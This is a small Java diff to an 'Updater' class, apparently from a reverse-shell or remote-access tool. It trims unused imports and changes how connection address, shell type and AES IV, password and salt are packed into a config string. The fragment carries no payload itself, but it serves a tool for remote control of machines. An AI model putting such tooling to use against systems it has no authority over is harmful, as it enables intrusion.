@@ -6,9 +6,7 @@ import java.io.IOException;
 import java.io.Writer;
 import java.nio.file.Files;
 import java.nio.file.Path;
-import java.nio.file.Paths;
 import java.util.Base64;
-import org.apache.commons.io.FileUtils;
 
 import com.revsni.common.Configuration.EncMode;
 import com.revsni.server.encryption.AES;
@@ -69,7 +67,7 @@ public class Updater {
             case AES:
                 AES aesReal = (AES) initEncri;
                 output = null;
-                output = address[0] + ";" + address[1] + ";" + Base64.getEncoder().encodeToString(shellType.getBytes()) + ";" + Base64.getEncoder().encodeToString(aesReal.getKey().getEncoded()) + ";" + Base64.getEncoder().encodeToString(aesReal.getIV().getIV()) + ";" + aesReal.getPassword()+ ";" + Base64.getEncoder().encodeToString(aesReal.getSalt().getBytes());
+                output = address[0] + ";" + address[1] + ";" + Base64.getEncoder().encodeToString(shellType.getBytes()) + ";" + Base64.getEncoder().encodeToString(aesReal.getIV().getIV()) + ";" + aesReal.getPassword()+ ";" + Base64.getEncoder().encodeToString(aesReal.getSalt());
                 return output;
             default:
                 return "";
